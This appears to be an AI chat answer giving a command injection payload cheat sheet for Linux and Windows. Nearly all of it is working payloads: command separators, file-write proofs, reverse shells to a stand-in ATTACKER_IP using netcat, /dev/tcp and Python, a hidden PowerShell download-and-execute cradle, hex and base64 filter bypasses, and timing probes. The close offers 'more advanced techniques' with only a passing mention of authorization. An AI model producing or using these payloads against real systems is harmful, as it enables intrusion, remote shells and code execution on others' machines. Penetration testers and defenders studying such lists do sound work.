Command Injection Payloads ðŸš€
Command injection vulnerabilities occur when user input is improperly sanitized and passed directly to system commands. Here are some common payloads for testing and exploiting such vulnerabilities.

1. Basic Command Injection
Linux/Unix
bash
Copy
Edit
; ls -la
| ls -la
&& ls -la
|| ls -la
$(ls -la)
`ls -la`
Windows
cmd
Copy
Edit
& dir
| dir
&& dir
|| dir
%COMSPEC% /c dir
2. Appending Additional Commands
Linux
bash
Copy
Edit
; whoami
| whoami
&& whoami
|| whoami
$(whoami)
`whoami`
Windows
cmd
Copy
Edit
& whoami
| whoami
&& whoami
|| whoami
3. Writing to a File (Proof of Exploit)
Linux
bash
Copy
Edit
echo "hacked" > /tmp/pwned
Windows
cmd
Copy
Edit
echo hacked > C:\pwned.txt
4. Reverse Shell (Linux)
Netcat
bash
Copy
Edit
nc -e /bin/sh ATTACKER_IP 4444
OR

bash
Copy
Edit
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
Python Reverse Shell
python
Copy
Edit
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
5. Reverse Shell (Windows)
Netcat
cmd
Copy
Edit
nc.exe -e cmd.exe ATTACKER_IP 4444
PowerShell Reverse Shell
powershell
Copy
Edit
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')"
6. Bypassing Filters
Using Hex Encoding
bash
Copy
Edit
; $(echo -e '\x2F\x62\x69\x6E\x2F\x62\x61\x73\x68')
Using Base64
bash
Copy
Edit
echo d2hvYW1pCg== | base64 -d | sh
7. Delaying Execution (Blind Injection)
If you suspect a blind command injection, use a delay:

bash
Copy
Edit
ping -c 10 127.0.0.1
sleep 10
For Windows:

cmd
Copy
Edit
ping 127.0.0.1 -n 10
timeout /T 10
These payloads can be used for testing (with proper authorization). Let me know if you need more advanced techniques! ðŸš€
